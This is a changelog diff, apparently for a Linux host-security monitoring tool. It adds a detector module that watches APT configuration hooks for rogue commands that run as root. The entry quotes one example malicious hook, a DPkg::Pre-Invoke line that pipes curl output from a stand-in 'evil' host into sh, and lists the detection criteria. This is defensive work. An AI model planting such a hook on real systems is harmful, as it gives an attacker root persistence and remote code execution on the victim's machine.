@@ -6,6 +6,24 @@ Versioning: [SemVer](https://semver.org/spec/v2.0.0.html).
 
 ## [Unreleased]
 
+### Added — module-ecosystem batch 59: continuation 141→142 (2026-05-26)
+
+Per operator direction ("keep mining niche detectors"). Adds the APT
+config-hook root-exec surface; L1 module-contracts coherent at 142, cargo
+modules::tests 16/16.
+
+- `apt-hooks-watchdog` (142) — boot+daily delta of the APT config hook
+  directives (/etc/apt/apt.conf + /etc/apt/apt.conf.d/*) + ownership +
+  command scan. APT runs DPkg::Pre-Invoke/Post-Invoke/Pre-Install-Pkgs
+  and APT::Update::Post-Invoke[-Success] hooks AS ROOT on every apt/dpkg
+  operation; a rogue hook (DPkg::Pre-Invoke {"curl evil|sh";};) is
+  root-exec persistence that fires on the next install/update (T1546). A
+  hook command under /tmp /home /dev/shm, world-writable, bare/relative,
+  an injection pattern, or a world-writable/non-root apt.conf is alert;
+  add/change/remove is warn. No-ops cleanly if absent. Distinct from
+  package-trust-baseline (repo/signature trust). Cadence boot+40min /
+  09:25.
+
 ### Added — module-ecosystem batch 58: continuation 140→141 (2026-05-26)
 
 Per operator direction ("keep mining niche detectors"). Adds the anacron
